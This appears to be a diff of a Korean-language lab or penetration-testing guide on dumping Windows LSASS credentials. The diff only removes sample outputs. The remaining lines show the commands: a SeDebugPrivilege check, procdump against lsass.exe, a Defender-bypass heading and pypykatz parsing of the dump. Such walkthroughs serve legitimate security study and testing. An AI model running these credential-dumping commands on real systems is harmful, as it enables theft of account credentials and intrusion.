@@ -9,10 +9,6 @@
 whoami /priv | findstr /i "SeDebug"
 ```
 
-```text
-SeDebugPrivilege              Debug programs                            Enabled
-```
-
 ## 2. SYSTEM 프로세스 확인 (PID 확보)
 
 ```powershell
@@ -57,11 +53,6 @@ Get-Item C:\temp\procdump.exe
 C:\temp\procdump.exe -accepteula -ma lsass.exe C:\temp\lsass.dmp
 ```
 
-```text
-Dumping process to C:\temp\lsass.dmp: 100%
-Dump complete: 1 dump file written.
-```
-
 ### Defender 우회 (내장 방식, 파일 전송 불필요)
 
 - Defender가 procdump를 삭제하면 사용
@@ -83,13 +74,6 @@ Get-Item C:\temp\lsass.dmp
 
 ```bash
 pypykatz lsa minidump /tmp/lsass.dmp
-```
-
-```text
-== LogonSession ==
-username: Administrator
-domainname: TARGET
-msv_creds: nthash REDACTED
 ```
 
 ## 5. 이해 포인트
